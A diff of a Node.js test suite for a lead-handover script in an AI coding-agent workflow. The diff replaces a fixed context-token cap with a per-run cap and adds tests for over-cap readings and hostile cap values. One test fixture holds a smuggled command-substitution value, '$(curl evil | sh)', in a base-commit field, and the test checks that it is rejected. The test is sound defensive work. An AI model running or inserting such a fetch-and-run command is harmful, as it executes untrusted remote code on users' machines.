@@ -7,7 +7,7 @@ import { spawnSync } from 'node:child_process';
 import { fileURLToPath } from 'node:url';
 import * as lead from './lead-handover.mjs';
 import {
-  HANDOVER_AT, CAP, HEADER, watch, resume, main, contextHandover, newSessionCommand,
+  HANDOVER_AT, CAP, HEADER, watch, resume, measure, main, contextHandover, newSessionCommand,
 } from './lead-handover.mjs';
 
 const here = path.dirname(fileURLToPath(import.meta.url));
@@ -20,7 +20,8 @@ after(() => { for (const d of tmps) fs.rmSync(d, { recursive: true, force: true 
 const iso = (ms) => new Date(ms).toISOString().replace(/\.\d{3}Z$/, 'Z');
 
 // One product root and one Claude config dir per test; nothing reads the real home.
-function fixture({ slug = 'demo-run', subs = [] } = {}) {
+// `cap` is the cap recorded on the run's start line; absent means none is recorded.
+function fixture({ slug = 'demo-run', subs = [], cap } = {}) {
   const base = fs.mkdtempSync(path.join(os.tmpdir(), 'lead-handover-'));
   tmps.push(base);
   const root = path.join(base, 'product');
@@ -29,7 +30,7 @@ function fixture({ slug = 'demo-run', subs = [] } = {}) {
   fs.mkdirSync(dir, { recursive: true });
   fs.mkdirSync(path.join(claudeDir, 'projects', 'p1'), { recursive: true });
   const now = Date.now();
-  const lines = [{ v: 1, at: iso(now - 60000), ev: 'start' }];
+  const lines = [{ v: 1, at: iso(now - 60000), ev: 'start', ...(cap === undefined ? {} : { cap }) }];
   for (const [i, s] of subs.entries()) {
     const id = String(i + 1).padStart(12, '0');
     lines.push({ v: 1, at: iso(now - 50000), ev: 'sub', role: 'backend-engineer', id, phase: 'start' });
@@ -55,7 +56,9 @@ function transcript(fx, usage, extra = []) {
   return file;
 }
 
-const USAGE_85500 = { input_tokens: 1000, cache_creation_input_tokens: 4000, cache_read_input_tokens: 80000, output_tokens: 500 };
+// A reading well under any cap, 85500 tokens in total; tests that care about a cap record one on the run.
+const USAGE_MID = { input_tokens: 1000, cache_creation_input_tokens: 4000, cache_read_input_tokens: 80000, output_tokens: 500 };
+const usageOf = (n) => ({ input_tokens: 10, output_tokens: 5, cache_creation_input_tokens: 0, cache_read_input_tokens: n - 15 });
 const preCompact = (file, extra = {}) => JSON.stringify({ hook_event_name: 'PreCompact', trigger: 'auto', transcript_path: file, ...extra });
 const sessionStart = (extra = {}) => JSON.stringify({ hook_event_name: 'SessionStart', source: 'compact', ...extra });
 // Most tests below cover the v1.6 rule, which `AICO_CONTEXT_GUARD=off` keeps; `optsOn` is the v1.7 default.
@@ -65,32 +68,34 @@ const handoffFile = (fx, n = 1) => path.join(fx.dir, `lead-handoff-${n}.md`);
 const records = (fx) => fs.readFileSync(path.join(fx.dir, 'lead-handover.jsonl'), 'utf8').trim().split('\n').map((l) => JSON.parse(l));
 
 describe('calibration', () => {
-  test('the hand-over point is fixed; the window constants are gone', () => {
-    assert.equal(HANDOVER_AT, 85500);
-    assert.equal(CAP, 95000);
+  test('the exported defaults are 180000 and 162000; the window constants are gone', () => {
+    assert.equal(HANDOVER_AT, 162000);
+    assert.equal(CAP, 180000);
+    assert.equal(Math.floor(CAP * 9 / 10), HANDOVER_AT);
     assert.equal(lead.AUTO_COMPACT_WINDOW, undefined);
     assert.equal(lead.COMPACT_RESERVE, undefined);
   });
 
-  test('the Contract is v2.2 and holds the hand-over point, not the window setup', () => {
+  test('the Contract is v2.3 and holds the run cap, not the window setup', () => {
     const text = fs.readFileSync(path.join(repo, 'docs', 'contracts', 'lead-handoff.md'), 'utf8');
-    assert.match(text, /^# Contract: lead-handoff v2\.2$/m);
-    assert.ok(text.includes('85500'));
+    assert.match(text, /^# Contract: lead-handoff v2\.3$/m);
+    assert.ok(text.includes('162000'));
+    assert.ok(text.includes('runCap'));
     assert.ok(text.includes('no setup'));
     assert.ok(!text.includes('\r'));
   });
 
   test('the script header names the Contract and what it uses', () => {
     const lines = fs.readFileSync(SCRIPT, 'utf8').split('\n');
-    assert.equal(lines[1], '// contract: docs/contracts/lead-handoff.md v2.2');
-    assert.equal(lines[2], '// uses: docs/contracts/run-state.md v2.0 docs/contracts/idea-flow.md v2.0 docs/contracts/tier-sets.md v1.2');
+    assert.equal(lines[1], '// contract: docs/contracts/lead-handoff.md v2.3');
+    assert.match(lines[2], /^\/\/ uses: docs\/contracts\/run-state\.md v2\.1 /);
   });
 });
 
 describe('watch', () => {
-  test('watch at 85500 asks for the Lead Handoff', () => {
+  test('watch asks for the Lead Handoff and records the reading', () => {
     const fx = fixture({ subs: ['stopped'] });
-    const r = watch(preCompact(transcript(fx, USAGE_85500)), opts(fx, { CLAUDE_CODE_AUTO_COMPACT_WINDOW: '98500' }));
+    const r = watch(preCompact(transcript(fx, USAGE_MID)), opts(fx, { CLAUDE_CODE_AUTO_COMPACT_WINDOW: '98500' }));
     assert.equal(r.code, 0);
     const text = fs.readFileSync(handoffFile(fx), 'utf8');
     assert.match(text, /^tokens-at-handover: 85500$/m);
@@ -109,42 +114,43 @@ describe('watch', () => {
 
   test('an unset window is recorded as null', () => {
     const fx = fixture();
-    assert.equal(watch(preCompact(transcript(fx, USAGE_85500)), opts(fx)).code, 0);
+    assert.equal(watch(preCompact(transcript(fx, USAGE_MID)), opts(fx)).code, 0);
     assert.match(fs.readFileSync(handoffFile(fx), 'utf8'), /^window: unknown$/m);
     assert.equal(records(fx).find((e) => e.ev === 'handover').window, null);
     const fx2 = fixture();
-    watch(preCompact(transcript(fx2, USAGE_85500)), opts(fx2, { CLAUDE_CODE_AUTO_COMPACT_WINDOW: '9x' }));
+    watch(preCompact(transcript(fx2, USAGE_MID)), opts(fx2, { CLAUDE_CODE_AUTO_COMPACT_WINDOW: '9x' }));
     assert.equal(records(fx2).find((e) => e.ev === 'handover').window, null);
   });
 
-  test('a running Step below the cap exits 2 and writes nothing', () => {
-    const fx = fixture({ subs: ['running'] });
-    const r = watch(preCompact(transcript(fx, USAGE_85500)), opts(fx));
+  test('a running Step below the run cap exits 2 and writes nothing', () => {
+    const fx = fixture({ subs: ['running'], cap: 120000 });
+    const r = watch(preCompact(transcript(fx, usageOf(100000))), opts(fx));
     assert.equal(r.code, 2);
     assert.match(r.err, /^aico: [^\n]{1,200}\n$/);
     assert.ok(!fs.existsSync(handoffFile(fx)));
     assert.ok(!fs.existsSync(path.join(fx.dir, 'lead-handover.jsonl')));
   });
 
-  test('at or over the cap, or with unknown tokens, a running Step never blocks', () => {
-    const fx = fixture({ subs: ['running'] });
-    const big = { ...USAGE_85500, cache_read_input_tokens: 90000 };
-    assert.equal(watch(preCompact(transcript(fx, big)), opts(fx)).code, 0);
+  test('at or over the run cap, or with unknown tokens, a running Step never blocks', () => {
+    const fx = fixture({ subs: ['running'], cap: 120000 });
+    assert.equal(watch(preCompact(transcript(fx, usageOf(119999))), opts(fx)).code, 2);
+    assert.equal(watch(preCompact(transcript(fx, usageOf(120000))), opts(fx)).code, 0);
+    assert.equal(watch(preCompact(transcript(fx, usageOf(125000))), opts(fx)).code, 0);
     assert.equal(watch(preCompact(path.join(fx.base, 'missing.jsonl')), opts(fx)).code, 0);
-    assert.equal(watch(preCompact(transcript(fx, USAGE_85500), { transcript_path: undefined }), opts(fx)).code, 0);
+    assert.equal(watch(preCompact(transcript(fx, USAGE_MID), { transcript_path: undefined }), opts(fx)).code, 0);
     assert.ok(!fs.existsSync(handoffFile(fx)));
   });
 
   test('a subagent payload is ignored', () => {
     const fx = fixture();
-    const r = watch(preCompact(transcript(fx, USAGE_85500), { agent_id: 'abc' }), opts(fx));
+    const r = watch(preCompact(transcript(fx, USAGE_MID), { agent_id: 'abc' }), opts(fx));
     assert.equal(r.code, 0);
     assert.ok(!fs.existsSync(handoffFile(fx)));
   });
 
   test('other events, bad JSON, big input and no run write nothing and exit 0', () => {
     const fx = fixture();
-    const file = transcript(fx, USAGE_85500);
+    const file = transcript(fx, USAGE_MID);
     assert.equal(watch(JSON.stringify({ hook_event_name: 'SessionStart', transcript_path: file }), opts(fx)).code, 0);
     assert.equal(watch('{not json', opts(fx)).code, 0);
     assert.equal(watch('[]', opts(fx)).code, 0);
@@ -158,7 +164,7 @@ describe('watch', () => {
   test('a transcript outside the projects folder gives unknown tokens', () => {
     const fx = fixture();
     const outside = path.join(fx.base, 'outside.jsonl');
-    fs.writeFileSync(outside, `${JSON.stringify({ type: 'assistant', message: { usage: USAGE_85500 } })}\n`);
+    fs.writeFileSync(outside, `${JSON.stringify({ type: 'assistant', message: { usage: USAGE_MID } })}\n`);
     assert.equal(watch(preCompact(outside), opts(fx)).code, 0);
     assert.match(fs.readFileSync(handoffFile(fx), 'utf8'), /^tokens-at-handover: unknown$/m);
     assert.equal(records(fx).find((e) => e.ev === 'handover').tokens, null);
@@ -166,7 +172,7 @@ describe('watch', () => {
 
   test('tokens come from the last main-chain usage; side chains and junk are skipped', () => {
     const fx = fixture();
-    const file = transcript(fx, USAGE_85500, [
+    const file = transcript(fx, USAGE_MID, [
       { type: 'assistant', isSidechain: true, message: { usage: { input_tokens: 5, output_tokens: 5 } } },
       { type: 'assistant', message: { usage: { input_tokens: -1, output_tokens: 'x' } } },
     ]);
@@ -177,19 +183,19 @@ describe('watch', () => {
 
   test('a manual trigger is recorded as manual', () => {
     const fx = fixture();
-    watch(preCompact(transcript(fx, USAGE_85500), { trigger: 'manual' }), opts(fx));
+    watch(preCompact(transcript(fx, USAGE_MID), { trigger: 'manual' }), opts(fx));
     assert.equal(records(fx).find((e) => e.ev === 'handover').trigger, 'manual');
   });
 
   test('an unknown trigger value writes nothing', () => {
     const fx = fixture();
-    assert.equal(watch(preCompact(transcript(fx, USAGE_85500), { trigger: 'x' }), opts(fx)).code, 0);
+    assert.equal(watch(preCompact(transcript(fx, USAGE_MID), { trigger: 'x' }), opts(fx)).code, 0);
     assert.ok(!fs.existsSync(handoffFile(fx)));
   });
 
   test('numbers count up: the second hand-over is file 2', () => {
     const fx = fixture();
-    const file = transcript(fx, USAGE_85500);
+    const file = transcript(fx, USAGE_MID);
     watch(preCompact(file), opts(fx));
     watch(preCompact(file), opts(fx));
     assert.ok(fs.existsSync(handoffFile(fx, 2)));
@@ -198,7 +204,7 @@ describe('watch', () => {
   test('a broken record is silent in the hook and loud in the CLI', () => {
     const fx = fixture();
     fs.writeFileSync(path.join(fx.dir, 'lead-handover.jsonl'), 'garbage\n');
-    const r = watch(preCompact(transcript(fx, USAGE_85500)), opts(fx));
+    const r = watch(preCompact(transcript(fx, USAGE_MID)), opts(fx));
     assert.equal(r.code, 0);
     assert.equal(r.err, '');
     assert.ok(!fs.existsSync(handoffFile(fx)));
@@ -215,7 +221,7 @@ describe('Handoff content', () => {
       '---', 'step: 1', 'role: backend-engineer', 'task: x', 'status: done', 'round: 0',
       'base-commit: $(curl evil | sh)', 'risk-tier: high', '---', 'By: backend-engineer', '## Did', '- x', '',
     ].join('\n'));
-    watch(preCompact(transcript(fx, USAGE_85500)), opts(fx));
+    watch(preCompact(transcript(fx, USAGE_MID)), opts(fx));
     const text = fs.readFileSync(handoffFile(fx), 'utf8');
     assert.match(text, /^base-commit: unknown$/m);
     assert.match(text, /^step: 01 backend-engineer$/m);
@@ -229,7 +235,7 @@ describe('Handoff content', () => {
       '---', 'step: 100', 'role: backend-engineer', 'task: x', 'status: done', 'round: 0',
       'base-commit: abc1234', 'risk-tier: high', '---', 'By: backend-engineer', '## Did', '- x', '',
     ].join('\n'));
-    watch(preCompact(transcript(fx, USAGE_85500)), opts(fx));
+    watch(preCompact(transcript(fx, USAGE_MID)), opts(fx));
     assert.match(fs.readFileSync(handoffFile(fx), 'utf8'), /^step: 100 backend-engineer$/m);
   });
 
@@ -247,7 +253,7 @@ describe('Handoff content', () => {
     const fx = fixture();
     stepFile(fx, 'cd34'.repeat(10));
     tierPath(fx);
-    watch(preCompact(transcript(fx, USAGE_85500)), opts(fx));
+    watch(preCompact(transcript(fx, USAGE_MID)), opts(fx));
     const text = fs.readFileSync(handoffFile(fx), 'utf8');
     assert.match(text, new RegExp(`^base-commit: ${BASE}$`, 'm'));
     assert.ok(!text.includes('cd34'));
@@ -257,7 +263,7 @@ describe('Handoff content', () => {
   test('without a tier-path record the base commit is unknown, whatever a Step file says', () => {
     const fx = fixture();
     stepFile(fx, BASE);
-    watch(preCompact(transcript(fx, USAGE_85500)), opts(fx));
+    watch(preCompact(transcript(fx, USAGE_MID)), opts(fx));
     const text = fs.readFileSync(handoffFile(fx), 'utf8');
     assert.match(text, /^base-commit: unknown$/m);
     assert.match(text, /^tier-path: none$/m);
@@ -269,7 +275,7 @@ describe('Handoff content', () => {
     const B = 'ab'.repeat(32);
     stepFile(fx, 'cd34'.repeat(10));
     assert.equal(main(['base', fx.slug, B], fx.root, {}).code, 0);
-    watch(preCompact(transcript(fx, USAGE_85500)), opts(fx));
+    watch(preCompact(transcript(fx, USAGE_MID)), opts(fx));
     const text = fs.readFileSync(handoffFile(fx), 'utf8');
     assert.match(text, new RegExp(`^base-commit: ${B}$`, 'm'));
     assert.match(text, /^tier-path: none$/m);
@@ -282,7 +288,7 @@ describe('Handoff content', () => {
     stepFile(fx, BASE);
     tierPath(fx);
     main(['base', fx.slug, 'ab'.repeat(20)], fx.root, {});
-    watch(preCompact(transcript(fx, USAGE_85500)), opts(fx));
+    watch(preCompact(transcript(fx, USAGE_MID)), opts(fx));
     assert.match(fs.readFileSync(handoffFile(fx), 'utf8'), new RegExp(`^base-commit: ${BASE}$`, 'm'));
   });
 
@@ -290,7 +296,7 @@ describe('Handoff content', () => {
     const fx = fixture();
     main(['base', fx.slug, 'ab'.repeat(20)], fx.root, {});
     fs.writeFileSync(path.join(fx.dir, 'tier-path.jsonl'), 'not json\n');
-    watch(preCompact(transcript(fx, USAGE_85500)), opts(fx));
+    watch(preCompact(transcript(fx, USAGE_MID)), opts(fx));
     assert.match(fs.readFileSync(handoffFile(fx), 'utf8'), /^base-commit: unknown$/m);
   });
 
@@ -298,7 +304,7 @@ describe('Handoff content', () => {
     const fx = fixture();
     stepFile(fx, BASE);
     tierPath(fx, [{ v: 1, at: iso(Date.now()), ev: 'raise', tier: 'high', cause: 'diff' }]);
-    watch(preCompact(transcript(fx, USAGE_85500)), opts(fx));
+    watch(preCompact(transcript(fx, USAGE_MID)), opts(fx));
     const text = fs.readFileSync(handoffFile(fx), 'utf8');
     assert.match(text, /^risk-tier: high$/m);
     assert.match(text, /^tier-path: feature full$/m);
@@ -310,7 +316,7 @@ describe('Handoff content', () => {
     const fx = fixture();
     stepFile(fx, BASE);
     fs.writeFileSync(path.join(fx.dir, 'tier-path.jsonl'), 'not json\n');
-    watch(preCompact(transcript(fx, USAGE_85500)), opts(fx));
+    watch(preCompact(transcript(fx, USAGE_MID)), opts(fx));
     const text = fs.readFileSync(handoffFile(fx), 'utf8');
     assert.match(text, /^risk-tier: high$/m);
     assert.match(text, /^tier-path: broken$/m);
@@ -321,19 +327,19 @@ describe('Handoff content', () => {
     const fx = fixture();
     const begin = { v: 1, at: iso(Date.now()), ev: 'begin', pb: 'fix', tier: 'low', path: 'short', why: 'short', rev: 1, base: '0'.repeat(40), skip: [] };
     fs.writeFileSync(path.join(fx.dir, 'tier-path.jsonl'), `${JSON.stringify(begin)}\n`);
-    watch(preCompact(transcript(fx, USAGE_85500)), opts(fx));
+    watch(preCompact(transcript(fx, USAGE_MID)), opts(fx));
     assert.match(fs.readFileSync(handoffFile(fx), 'utf8'), /^base-commit: unknown$/m);
   });
 
   test('an open Gate is a pending form; a passed Gate is not', () => {
     const fx = fixture();
     addRun(fx, { ev: 'ask', gate: 'ship' });
-    watch(preCompact(transcript(fx, USAGE_85500)), opts(fx));
+    watch(preCompact(transcript(fx, USAGE_MID)), opts(fx));
     let text = fs.readFileSync(handoffFile(fx), 'utf8');
     assert.match(text, /^gate: ship open$/m);
     assert.match(text, /^form: pending gate-ship$/m);
     addRun(fx, { ev: 'gate', gate: 'ship', result: 'passed' });
-    watch(preCompact(transcript(fx, USAGE_85500)), opts(fx));
+    watch(preCompact(transcript(fx, USAGE_MID)), opts(fx));
     text = fs.readFileSync(handoffFile(fx, 2), 'utf8');
     assert.match(text, /^gate: ship passed$/m);
     assert.match(text, /^form: none$/m);
@@ -342,13 +348,13 @@ describe('Handoff content', () => {
   test('an open idea form is a pending form and the playbook comes from begin', () => {
     const fx = fixture();
     fs.writeFileSync(path.join(fx.dir, 'idea-flow.jsonl'), `${JSON.stringify({ e: 'start', kind: 'bug', ts: '2026-10-30T10:00:00.000Z' })}\n`);
-    watch(preCompact(transcript(fx, USAGE_85500)), opts(fx));
+    watch(preCompact(transcript(fx, USAGE_MID)), opts(fx));
     let text = fs.readFileSync(handoffFile(fx), 'utf8');
     assert.match(text, /^playbook: bug$/m);
     assert.match(text, /^form: pending idea-grill$/m);
     assert.match(text, /^records: \[run-state\.jsonl, idea-flow\.jsonl, lead-handover\.jsonl\]$/m);
     assert.equal(main(['begin', fx.slug, 'feature'], fx.root, {}).code, 0);
-    watch(preCompact(transcript(fx, USAGE_85500)), opts(fx));
+    watch(preCompact(transcript(fx, USAGE_MID)), opts(fx));
     text = fs.readFileSync(handoffFile(fx, 2), 'utf8');
     assert.match(text, /^playbook: feature$/m);
   });
@@ -358,7 +364,7 @@ describe('Handoff content', () => {
     const ts = '2026-10-30T10:00:00.000Z';
     const ev = [{ e: 'start', kind: 'idea', ts }, { e: 'pick', letter: '1', route: 'grill', ts }];
     fs.writeFileSync(path.join(fx.dir, 'idea-flow.jsonl'), ev.map((e) => `${JSON.stringify(e)}\n`).join(''));
-    watch(preCompact(transcript(fx, USAGE_85500)), opts(fx));
+    watch(preCompact(transcript(fx, USAGE_MID)), opts(fx));
     const text = fs.readFileSync(handoffFile(fx), 'utf8');
     assert.match(text, /^form: pending step-grill$/m);
     assert.doesNotMatch(text, /step-grilling/);
@@ -366,7 +372,7 @@ describe('Handoff content', () => {
 
   test('the file stays small and holds only fixed words under Next', () => {
     const fx = fixture();
-    watch(preCompact(transcript(fx, USAGE_85500)), opts(fx));
+    watch(preCompact(transcript(fx, USAGE_MID)), opts(fx));
     const text = fs.readFileSync(handoffFile(fx), 'utf8');
     assert.ok(Buffer.byteLength(text) < 2048);
     const next = text.slice(text.indexOf('## Next'));
@@ -450,7 +456,7 @@ describe('finding the run', () => {
     fs.mkdirSync(path.join(work, 'zzz-open'), { recursive: true });
     fs.writeFileSync(path.join(work, 'zzz-open', 'idea-flow.jsonl'), `${JSON.stringify({ e: 'start', kind: 'idea', ts: '2026-10-30T10:00:00.000Z' })}\n`);
     const fx = { root, claudeDir, dir: path.join(work, 'zzz-open'), slug: 'zzz-open' };
-    watch(preCompact(transcript(fx, USAGE_85500)), { root, claudeDir, env: { AICO_CONTEXT_GUARD: 'off' } });
+    watch(preCompact(transcript(fx, USAGE_MID)), { root, claudeDir, env: { AICO_CONTEXT_GUARD: 'off' } });
     assert.ok(fs.existsSync(path.join(work, 'zzz-open', 'lead-handoff-1.md')));
   });
 });
@@ -458,7 +464,7 @@ describe('finding the run', () => {
 describe('resume', () => {
   const written = () => {
     const fx = fixture();
-    watch(preCompact(transcript(fx, USAGE_85500)), opts(fx));
+    watch(preCompact(transcript(fx, USAGE_MID)), opts(fx));
     return fx;
   };
 
@@ -604,7 +610,7 @@ describe('CLI', () => {
   test('the process end to end: watch writes, resume injects', () => {
     const fx = fixture({ subs: ['stopped'] });
     const env = { ...process.env, CLAUDE_CONFIG_DIR: fx.claudeDir, CLAUDE_CODE_AUTO_COMPACT_WINDOW: '98500', AICO_CONTEXT_GUARD: 'off' };
-    const w = spawnSync(process.execPath, [SCRIPT, 'watch'], { cwd: fx.root, input: preCompact(transcript(fx, USAGE_85500)), encoding: 'utf8', env });
+    const w = spawnSync(process.execPath, [SCRIPT, 'watch'], { cwd: fx.root, input: preCompact(transcript(fx, USAGE_MID)), encoding: 'utf8', env });
     assert.equal(w.status, 0);
     const r = spawnSync(process.execPath, [SCRIPT, 'resume'], { cwd: fx.root, input: sessionStart(), encoding: 'utf8', env });
     assert.equal(r.status, 0);
@@ -618,7 +624,7 @@ describe('v1.7 watch by trigger', () => {
   test('auto in an active run exits 2 with one fixed line and writes nothing, whatever the tokens or Step state', () => {
     for (const subs of [[], ['running'], ['stopped']]) {
       const fx = fixture({ subs });
-      for (const usage of [USAGE_85500, { ...USAGE_85500, cache_read_input_tokens: 90000 }, { input_tokens: 5 }]) {
+      for (const usage of [USAGE_MID, usageOf(170000), usageOf(400000), { input_tokens: 5 }]) {
         const r = watch(preCompact(transcript(fx, usage)), optsOn(fx));
         assert.equal(r.code, 2);
         assert.match(r.err, /^aico: automatic compaction is blocked during a run; [^\n]{1,120}\n$/);
@@ -632,16 +638,16 @@ describe('v1.7 watch by trigger', () => {
   test('auto without an active run, or from a subagent, stays silent', () => {
     const fx = fixture();
     fs.rmSync(path.join(fx.dir, 'run-state.jsonl'));
-    assert.deepEqual(watch(preCompact(transcript(fx, USAGE_85500)), optsOn(fx)), { code: 0, err: '' });
+    assert.deepEqual(watch(preCompact(transcript(fx, USAGE_MID)), optsOn(fx)), { code: 0, err: '' });
     const fx2 = fixture();
-    assert.deepEqual(watch(preCompact(transcript(fx2, USAGE_85500), { agent_id: 'a1' }), optsOn(fx2)), { code: 0, err: '' });
+    assert.deepEqual(watch(preCompact(transcript(fx2, USAGE_MID), { agent_id: 'a1' }), optsOn(fx2)), { code: 0, err: '' });
   });
 
   test('manual is never blocked: a clean point writes, a running Step writes nothing', () => {
     const fx = fixture({ subs: ['stopped'] });
-    assert.equal(watch(manual(transcript(fx, USAGE_85500)), optsOn(fx)).code, 0);
+    assert.equal(watch(manual(transcript(fx, USAGE_MID)), optsOn(fx)).code, 0);
     assert.match(fs.readFileSync(handoffFile(fx), 'utf8'), /^trigger: manual$/m);
-    for (const usage of [{ ...USAGE_85500, cache_read_input_tokens: 10000 }, USAGE_85500, { input_tokens: 5 }]) {
+    for (const usage of [{ ...USAGE_MID, cache_read_input_tokens: 10000 }, USAGE_MID, { input_tokens: 5 }]) {
       const fy = fixture({ subs: ['running'] });
       assert.deepEqual(watch(manual(transcript(fy, usage)), optsOn(fy)), { code: 0, err: '' });
       assert.ok(!fs.existsSync(handoffFile(fy)));
@@ -650,12 +656,13 @@ describe('v1.7 watch by trigger', () => {
 
   test('AICO_CONTEXT_GUARD=off returns watch to the v1.6 rule', () => {
     const fx = fixture({ subs: ['running'] });
-    assert.equal(watch(preCompact(transcript(fx, USAGE_85500)), optsOn(fx, { AICO_CONTEXT_GUARD: 'off' })).code, 2);
-    assert.equal(watch(preCompact(transcript(fx, USAGE_85500)), optsOn(fx, { AICO_CONTEXT_GUARD: 'OFF' })).code, 2);
-    const big = { ...USAGE_85500, cache_read_input_tokens: 90000 };
-    assert.equal(watch(preCompact(transcript(fx, big)), optsOn(fx, { AICO_CONTEXT_GUARD: 'off' })).code, 0);
+    assert.equal(watch(preCompact(transcript(fx, USAGE_MID)), optsOn(fx, { AICO_CONTEXT_GUARD: 'off' })).code, 2);
+    assert.equal(watch(preCompact(transcript(fx, USAGE_MID)), optsOn(fx, { AICO_CONTEXT_GUARD: 'OFF' })).code, 2);
+    const fz = fixture({ subs: ['running'], cap: 120000 });
+    assert.equal(watch(preCompact(transcript(fz, usageOf(119999))), optsOn(fz, { AICO_CONTEXT_GUARD: 'off' })).code, 2);
+    assert.equal(watch(preCompact(transcript(fz, usageOf(120000))), optsOn(fz, { AICO_CONTEXT_GUARD: 'off' })).code, 0);
     const fy = fixture({ subs: ['stopped'] });
-    assert.equal(watch(preCompact(transcript(fy, USAGE_85500)), optsOn(fy, { AICO_CONTEXT_GUARD: 'off' })).code, 0);
+    assert.equal(watch(preCompact(transcript(fy, USAGE_MID)), optsOn(fy, { AICO_CONTEXT_GUARD: 'off' })).code, 0);
     assert.match(fs.readFileSync(handoffFile(fy), 'utf8'), /^trigger: auto$/m);
   });
 });
@@ -789,11 +796,13 @@ describe('pipeline wiring', () => {
     }
   });
 
-  test('the Lead budget line is the fixed cap and the automatic hand-over, no manual resume', () => {
+  test('the Lead budget line is the run cap and the automatic hand-over, no manual resume', () => {
     assert.ok(!pipeline.includes('150k'));
     assert.ok(!pipeline.includes('00-lead-state'));
     assert.ok(!/resume <slug>/.test(pipeline));
-    assert.ok(pipeline.includes('95000') && pipeline.includes('85500'));
+    assert.ok(!pipeline.includes('95000') && !pipeline.includes('85500'), 'the skill no longer names a fixed cap as current');
+    assert.ok(!/fixed cap/i.test(pipeline));
+    assert.match(pipeline, /run-state[^\n]* show [^\n]*--json[^\n]*\bcap\b[^\n]*\bhandover\b/);
     assert.ok(pipeline.includes('references/lead-handover.md'));
   });
 
@@ -808,7 +817,7 @@ describe('pipeline wiring', () => {
     const line = pipeline.split('\n').find((l) => l.startsWith('**Base commit:**'));
     assert.ok(line.includes('scripts/run.mjs" lead-handover base'));
     assert.ok(ref.includes('lead-handover base'));
-    assert.ok(fs.readFileSync(path.join(repo, 'docs', 'contracts', 'lead-handoff.md'), 'utf8').startsWith('# Contract: lead-handoff v2.2'));
+    assert.ok(fs.readFileSync(path.join(repo, 'docs', 'contracts', 'lead-handoff.md'), 'utf8').startsWith('# Contract: lead-handoff v2.3'));
   });
 
   test('the Ship Gate Core line is the Architect list for feature and the summary list for fix', () => {
@@ -829,9 +838,9 @@ describe('pipeline wiring', () => {
 
 // run-state v2.0: the newest open run may be a v3 run `<ID>/<NN>-<playbook>`.
 describe('run-state v2.0 cites and v3 runs', () => {
-  test('context-guard and run-guard cite run-state v2.0 on their uses line; triage names v2.0', () => {
+  test('context-guard cites run-state v2.1 and run-guard v2.0 on their uses line; triage names v2.0', () => {
     const uses = (f) => fs.readFileSync(path.join(here, f), 'utf8').split(/\r?\n/)[2];
-    assert.match(uses('context-guard.mjs'), /docs\/contracts\/run-state\.md v2\.0(?![\d.])/);
+    assert.match(uses('context-guard.mjs'), /docs\/contracts\/run-state\.md v2\.1(?![\d.])/);
     assert.match(uses('run-guard.mjs'), /docs\/contracts\/run-state\.md v2\.0(?![\d.])/);
     const triage = fs.readFileSync(path.join(repo, 'skills', 'triage', 'SKILL.md'), 'utf8').split(/\r?\n/)[23];
     assert.match(triage, /run-state v2\.0/);
@@ -851,5 +860,53 @@ describe('run-state v2.0 cites and v3 runs', () => {
     fs.writeFileSync(path.join(old, 'run-state.jsonl'), `${JSON.stringify({ v: 1, at: iso(fx.now - 3600000), ev: 'start' })}
 `);
     assert.equal(lead.findRun(fx.root, fx.now), 'P20261109.000002-10.00.00');
+  });
+});
+
+// lead-handoff v2.3: every Lead check reads the cap of the active run (recorded cap, else the setting, else 180000).
+describe('over cap mark and Stop reading use the run cap', () => {
+  const stop = (file) => JSON.stringify({ hook_event_name: 'Stop', transcript_path: file, session_id: 'sess-1' });
+  const readOut = (fx, tokens) => {
+    measure(stop(transcript(fx, usageOf(tokens))), { root: fx.root, claudeDir: fx.claudeDir, env: {}, now: fx.now });
+    return main(['read', fx.slug], fx.root, {}).out;
+  };
+  const mark = (out, key) => out.split('\n').find((l) => l.startsWith(`${key} `));
+
+  test('cap 120000: 100000 has no mark, 125000 is over cap', () => {
+    const fx = fixture({ cap: 120000 });
+    assert.equal(mark(readOut(fx, 100000), 'lead ctx'), 'lead ctx 100000');
+    const fy = fixture({ cap: 120000 });
+    assert.equal(mark(readOut(fy, 125000), 'lead ctx'), 'lead ctx 125000 over cap');
+    assert.equal(mark(main(['read', fy.slug], fy.root, {}).out, 'lead peak'), 'lead peak 125000 over cap');
+  });
+
+  test('the mark is above the cap, not at it: 120000 has none, 120001 has one', () => {
+    assert.equal(mark(readOut(fixture({ cap: 120000 }), 120000), 'lead ctx'), 'lead ctx 120000');
+    assert.equal(mark(readOut(fixture({ cap: 120000 }), 120001), 'lead ctx'), 'lead ctx 120001 over cap');
+  });
+
+  test('no recorded cap: the mark is above 180000', () => {
+    assert.equal(mark(readOut(fixture(), 170000), 'lead ctx'), 'lead ctx 170000');
+    assert.equal(mark(readOut(fixture(), 180001), 'lead ctx'), 'lead ctx 180001 over cap');
+  });
+
+  test('a hostile recorded cap falls back to 180000 and the run is still read', () => {
+    for (const bad of ['120000', 0, -1, 2e9, 59999, 1000001, null]) {
+      assert.equal(mark(readOut(fixture({ cap: bad }), 170000), 'lead ctx'), 'lead ctx 170000', JSON.stringify(bad));
+      assert.equal(mark(readOut(fixture({ cap: bad }), 181000), 'lead ctx'), 'lead ctx 181000 over cap', JSON.stringify(bad));
+    }
+  });
+
+  test('PreCompact with a running Step uses the run cap under the v1.6 rule', () => {
+    const fx = fixture({ subs: ['running'], cap: 200000 });
+    assert.equal(watch(preCompact(transcript(fx, usageOf(190000))), opts(fx)).code, 2);
+    assert.equal(watch(preCompact(transcript(fx, usageOf(200000))), opts(fx)).code, 0);
+  });
+
+  test('without an active run the Stop hook writes no reading', () => {
+    const fx = fixture({ cap: 120000 });
+    fs.rmSync(path.join(fx.dir, 'run-state.jsonl'));
+    measure(stop(transcript(fx, usageOf(125000))), { root: fx.root, claudeDir: fx.claudeDir, env: {}, now: fx.now });
+    assert.ok(!fs.existsSync(path.join(fx.dir, 'lead-context.json')));
   });
 });
